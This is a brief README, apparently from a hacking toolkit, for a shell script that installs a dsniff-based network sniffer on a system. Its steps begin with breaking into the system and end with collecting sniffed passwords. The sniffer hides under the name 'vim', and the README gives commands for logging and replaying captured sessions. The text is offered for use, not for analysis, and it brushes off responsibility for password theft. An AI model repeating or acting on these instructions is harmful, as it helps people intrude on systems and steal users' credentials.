The backbone of this script is

libnet
libnids
dsniff


This is no special program or nothing, its just a 
fast hassle free way to install a sniffer on a system

Next version will have more stuff.. can't be arsed right now.

By the way - if you do anything bad with this.. like sniff passwords so be it... 
its nothing to do with me ok?? 


/// INSTALL \\\

1)  h4X0r into a system like a hard man
2)  Get some milk and cookies
3)  sh run.sh
4)  Sleep
5)  Get up
6)  Look for sniffed passwords in terminal.

After running run.sh follow onscreen instructions

\\\ RUN ///

Once installed it'll tell you where it is and auto run in your term

Also there will be a file in your current directory called 'vim' - 
this is just a copy of the sniffer for next time you log in.

./vim -m

To log the sessions:

./vim -m -w save.file    for a while

then...

./vim -r save.file       to read sniffed session
